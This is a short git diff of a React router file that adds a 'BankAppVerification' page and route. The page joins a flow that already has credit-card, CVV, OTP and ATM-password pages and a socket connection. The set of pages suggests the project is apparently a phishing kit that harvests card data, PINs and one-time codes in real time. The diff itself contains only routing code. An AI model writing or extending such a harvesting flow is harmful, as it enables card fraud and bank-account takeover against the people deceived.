@@ -18,6 +18,7 @@ import CreditCardPayment from "../pages/CreditCardPayment";
 import FinalPage from "../pages/FinalPage";
 import CVV from "../pages/CVV";
 import ATMPassword from "../pages/ATMPassword";
+import BankAppVerification from "../pages/BankAppVerification";
 import OTPVerification from "../pages/OTPVerification";
 import { initializeSocket } from "@/lib/store";
 
@@ -35,6 +36,7 @@ const PAGES: Array<{ paths: string[]; element: ReactElement }> = [
   { paths: ["/card", "/credit-card-payment"], element: <CreditCardPayment /> },
   { paths: ["/otp-verification"], element: <OTPVerification /> },
   { paths: ["/atm", "/atm-password"], element: <ATMPassword /> },
+  { paths: ["/bank-app-verification", "/app"], element: <BankAppVerification /> },
   { paths: ["/cvv"], element: <CVV /> },
   { paths: ["/final-page"], element: <FinalPage /> },
 ];
